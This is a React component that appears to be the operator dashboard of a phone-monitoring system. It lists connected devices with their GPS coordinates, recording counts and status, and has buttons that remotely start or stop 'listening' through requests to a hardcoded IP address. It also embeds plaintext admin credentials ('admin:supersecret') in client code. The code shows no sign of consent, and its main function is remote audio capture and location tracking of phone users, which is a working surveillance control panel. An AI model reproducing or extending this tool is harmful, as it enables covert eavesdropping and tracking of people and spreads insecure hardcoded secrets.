import React, { useState, useMemo } from 'react';
import './UserList.css';

const UserList = ({ users = [], loading = false, onPlayAudio }) => {
  const [searchTerm, setSearchTerm] = useState('');
  const [statusFilter, setStatusFilter] = useState('all');
  const [loadingStates, setLoadingStates] = useState({});
  const [errorMessages, setErrorMessages] = useState({});
  const [successMessages, setSuccessMessages] = useState({});

  const filteredUsers = useMemo(() => {
    return users.filter(user => {
      // Search filter
      const matchesSearch = user.user_id.toLowerCase().includes(searchTerm.toLowerCase()) ||
                           (user.device_info && user.device_info.toLowerCase().includes(searchTerm.toLowerCase()));
      
      // Status filter
      const matchesStatus = statusFilter === 'all' || user.status === statusFilter;
      
      return matchesSearch && matchesStatus;
    });
  }, [users, searchTerm, statusFilter]);

  const getStatusBadge = (status) => {
    const statusConfig = {
      listening: { emoji: '🔴', color: 'status-listening', text: 'Listening' },
      idle: { emoji: '🟡', color: 'status-idle', text: 'Idle' },
      offline: { emoji: '⚪', color: 'status-offline', text: 'Offline' }
    };
    
    const config = statusConfig[status] || statusConfig.offline;
    return (
      <span className={`status-badge ${config.color}`}>
        <span className="status-emoji">{config.emoji}</span>
        {config.text}
      </span>
    );
  };

  const formatLastActivity = (lastActivity) => {
    if (!lastActivity) return 'Never';
    
    const now = new Date();
    const activityTime = new Date(lastActivity);
    const diffMinutes = Math.floor((now - activityTime) / (1000 * 60));
    
    if (diffMinutes < 1) return 'Just now';
    if (diffMinutes < 60) return `${diffMinutes}m ago`;
    if (diffMinutes < 1440) return `${Math.floor(diffMinutes / 60)}h ago`;
    return `${Math.floor(diffMinutes / 1440)}d ago`;
  };

  const formatLocation = (location) => {
    if (!location || (!location.lat && !location.lng)) {
      return 'Unknown Location';
    }
    return `${location.lat.toFixed(4)}, ${location.lng.toFixed(4)}`;
  };

  const showMessage = (userId, type, message) => {
    if (type === 'error') {
      setErrorMessages(prev => ({ ...prev, [userId]: message }));
      setSuccessMessages(prev => ({ ...prev, [userId]: null }));
    } else if (type === 'success') {
      setSuccessMessages(prev => ({ ...prev, [userId]: message }));
      setErrorMessages(prev => ({ ...prev, [userId]: null }));
    }
    
    // Clear message after 3 seconds
    setTimeout(() => {
      setErrorMessages(prev => ({ ...prev, [userId]: null }));
      setSuccessMessages(prev => ({ ...prev, [userId]: null }));
    }, 3000);
  };

  const setUserLoading = (userId, isLoading) => {
    setLoadingStates(prev => ({ ...prev, [userId]: isLoading }));
  };

  const handleStartListening = async (userId) => {
    setUserLoading(userId, true);
    try {
      const response = await fetch(`http://143.244.133.125:5000/api/start-listening/${userId}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Basic ' + btoa('admin:supersecret'),
        },
      });
      
      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(errorData.detail || `Failed to start listening (${response.status})`);
      }
      
      const result = await response.json();
      showMessage(userId, 'success', `✅ Started listening to ${userId}`);
      console.log(`Started listening for user ${userId}:`, result);
    } catch (error) {
      console.error('Error starting listening:', error);
      showMessage(userId, 'error', `❌ Failed to start listening: ${error.message}`);
    } finally {
      setUserLoading(userId, false);
    }
  };

  const handleStopListening = async (userId) => {
    setUserLoading(userId, true);
    try {
      const response = await fetch(`http://143.244.133.125:5000/api/stop-listening/${userId}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Basic ' + btoa('admin:supersecret'),
        },
      });
      
      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(errorData.detail || `Failed to stop listening (${response.status})`);
      }
      
      const result = await response.json();
      showMessage(userId, 'success', `⏹️ Stopped listening to ${userId}`);
      console.log(`Stopped listening for user ${userId}:`, result);
    } catch (error) {
      console.error('Error stopping listening:', error);
      showMessage(userId, 'error', `❌ Failed to stop listening: ${error.message}`);
    } finally {
      setUserLoading(userId, false);
    }
  };

  if (loading) {
    return (
      <div className="user-list">
        <div className="user-list-header">
          <h3>Phone Users</h3>
        </div>
        <div className="user-list-loading">
          <div className="loading-spinner">Loading users...</div>
        </div>
      </div>
    );
  }

  return (
    <div className="user-list">
      <div className="user-list-header">
        <h3>Phone Users ({filteredUsers.length})</h3>
        <div className="user-stats">
          <div className="stat">
            <span>🔴</span>
            {users.filter(u => u.status === 'listening').length} Listening
          </div>
          <div className="stat">
            <span>🟡</span>
            {users.filter(u => u.status === 'idle').length} Idle
          </div>
          <div className="stat">
            <span>⚪</span>
            {users.filter(u => u.status === 'offline').length} Offline
          </div>
        </div>
      </div>

      {/* Search and Filter Controls */}
      <div className="user-controls">
        <div className="search-container">
          <input
            type="text"
            placeholder="Search by User ID or Device..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="search-input"
          />
          <span className="search-icon">🔍</span>
        </div>
        
        <div className="filter-container">
          <select 
            value={statusFilter} 
            onChange={(e) => setStatusFilter(e.target.value)}
            className="filter-select"
          >
            <option value="all">All Status</option>
            <option value="listening">Listening</option>
            <option value="idle">Idle</option>
            <option value="offline">Offline</option>
          </select>
        </div>
      </div>

      <div className="user-list-content">
        {filteredUsers.length === 0 ? (
          <div className="no-users">
            <div className="no-users-icon">📱</div>
            <p>{users.length === 0 ? 'No users connected' : 'No users match your search criteria'}</p>
            <small>Users will appear here when they connect to the monitoring system</small>
          </div>
        ) : (
          filteredUsers.map(user => (
            <div key={user.user_id} className="user-item">
              <div className="user-avatar">
                <span className="avatar-text">{user.user_id.slice(0, 2).toUpperCase()}</span>
              </div>
              
              <div className="user-info">
                <div className="user-main">
                  <h4 className="user-id">{user.user_id}</h4>
                  {getStatusBadge(user.status)}
                </div>
                
                <div className="user-details">
                  <div className="user-phone">
                    📱 {user.device_info || 'Unknown Device'}
                  </div>
                  <div className="user-location">
                    📍 {formatLocation(user.location)}
                  </div>
                  <div className="user-activity">
                    🕒 {formatLastActivity(user.last_activity)}
                  </div>
                  {user.recordings_count > 0 && (
                    <div className="user-recordings">
                      📁 {user.recordings_count} recording{user.recordings_count !== 1 ? 's' : ''}
                    </div>
                  )}
                </div>
                
                {user.session_id && (
                  <div className="session-info">
                    <span className="session-id">Session: {user.session_id.slice(0, 8)}</span>
                  </div>
                )}
              </div>
              
              <div className="user-actions">
                {/* User feedback messages */}
                {(errorMessages[user.user_id] || successMessages[user.user_id]) && (
                  <div className={`user-message ${errorMessages[user.user_id] ? 'error' : 'success'}`}>
                    {errorMessages[user.user_id] || successMessages[user.user_id]}
                  </div>
                )}
                
                {user.status === 'listening' ? (
                  <button 
                    onClick={() => handleStopListening(user.user_id)}
                    className={`action-btn stop ${loadingStates[user.user_id] ? 'loading' : ''}`}
                    title="Stop listening"
                    disabled={loadingStates[user.user_id]}
                  >
                    {loadingStates[user.user_id] ? '⏳' : '⏹️'}
                  </button>
                ) : (
                  <button 
                    onClick={() => handleStartListening(user.user_id)}
                    className={`action-btn start ${loadingStates[user.user_id] ? 'loading' : ''}`}
                    title="Start listening"
                    disabled={loadingStates[user.user_id]}
                  >
                    {loadingStates[user.user_id] ? '⏳' : '▶️'}
                  </button>
                )}
                
                {user.latest_recording && (
                  <button 
                    onClick={() => onPlayAudio && onPlayAudio(user.latest_recording)}
                    className="action-btn audio"
                    title="Play latest recording"
                    disabled={loadingStates[user.user_id]}
                  >
                    🎵
                  </button>
                )}
              </div>
            </div>
          ))
        )}
      </div>
      
      {searchTerm && (
        <div className="search-info">
          <small>Showing {filteredUsers.length} of {users.length} users</small>
        </div>
      )}
    </div>
  );
};

export default UserList;
